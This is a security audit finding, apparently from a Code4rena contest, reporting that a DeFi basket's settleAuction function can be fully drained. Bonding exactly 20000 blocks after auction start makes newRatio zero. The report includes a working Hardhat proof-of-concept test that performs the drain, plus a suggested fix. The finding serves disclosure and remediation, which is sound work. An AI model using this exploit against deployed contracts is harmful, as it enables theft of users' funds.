## Tags

- bug
- 2 (Med Risk)
- sponsor confirmed

# [Basket can be fully drained if the auction is settled within a specific block](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/74) 

# Handle

Ruhum


# Vulnerability details

## Impact
The `settleAuction()` function allows someone to settle the auction by transferring funds in a way that the new pending index is fulfilled. As a reward, they are able to take out as many tokens as they want as long as the pending index is fulfilled after that. The function verifies that the basket has received everything it wanted using the following logic:
```sol
        for (uint256 i = 0; i < pendingWeights.length; i++) {
            uint256 tokensNeeded = basketAsERC20.totalSupply() * pendingWeights[i] * newRatio / BASE / BASE;
            require(IERC20(pendingTokens[i]).balanceOf(address(basket)) >= tokensNeeded);
        }
```
The attack vector here is to manipulate `tokensNeeded` to be 0. That way we can drain the basket completely without the function reverting.

For that, we manipulate `newRatio` to be 0 then the whole thing will be 0.
`newRatio` is defined as:
```sol
        uint256 a = factory.auctionMultiplier() * basket.ibRatio();
        uint256 b = (bondBlock - auctionStart) * BASE / factory.auctionDecrement();
        uint256 newRatio = a - b;
```
There's 1 value the attacker controls, `bondBlock`. That value is the block in which the `bondForRebalance()` function was triggered.
So the goal is to get `newRatio` to be 0. With the base settings of the contract:

- auctionMultiplier == 2
- ibRatio == 1e18
- BASE == 1e18
- auctionDecrement == 10000

`bondBlock` has to be `auctionStart + 20000`. Meaning, the `bondForRebalance()` function has to be triggered exactly 20000 blocks after the action was started. That would be around 3 1/2 days after auction start.

At that point, `newRatio` is 0, and thus `tokensNeeded` is 0. The only thing left to do is to call `settleAuction()` and pass the basket's tokens and balance as the output tokens and weight.

## Proof of Concept
Here's a test implementing the above scenario as a test. You can add it to `Auction.test.js`.:

```js
      it.only("should allow me to steal funds", async() => {
        // start an auction
        let NEW_UNI_WEIGHT = "2400000000000000000";
        let NEW_COMP_WEIGHT = "2000000000000000000";
        let NEW_AAVE_WEIGHT = "400000000000000000";

        await expect(basket.publishNewIndex([UNI.address, COMP.address, AAVE.address], 
            [NEW_UNI_WEIGHT, NEW_COMP_WEIGHT, NEW_AAVE_WEIGHT], 1)).to.be.ok;
        await increaseTime(60 * 60 * 24)
        await increaseTime(60 * 60 * 24)
        await expect(basket.publishNewIndex([UNI.address, COMP.address, AAVE.address], 
          [NEW_UNI_WEIGHT, NEW_COMP_WEIGHT, NEW_AAVE_WEIGHT], 1)).to.be.ok;

        let auctionAddr = await basket.auction();
        let auction = AuctionImpl.attach(auctionAddr);

        ethers.provider.getBlockNumber();
        // increase the block number for `bondBlock - auctionStart` to be 20000.
        // When that's the case, the result of `newRatio` in `settleAuction()` 
        // is `0`. And that means `tokensNeeded` is 0. Which means,
        // we can take out all the tokens we want using the `outputTokens` array
        // without having to worry about basket's balance at the end.
        // The math changes depending on the settings of the factory contract or the
        // Basket contract. But, the gist is that you try to get newRatio to be 0.
        // The only values you can control as a attacker is the bondBlock after the auction
        // was started.
        for (let i = 0; i < 20000; i++) {
          await hre.network.provider.send("evm_mine")
        }
        await basket.approve(auction.address, '5000000000000000');
        await expect(auction.bondForRebalance()).to.be.ok;
        await expect(auction.settleAuction([], [], [], [UNI.address, AAVE.address], ["200720000000000000", "200120000000000000"])).to.be.ok;
      });
```

Again, this test uses the base values. The math changes when the settings change. But, it should always be possible to trigger this attack. The gap between auction start and bonding just changes.

## Tools Used
manual analysis

## Recommended Mitigation Steps
- Verify that `newRatio != 0`

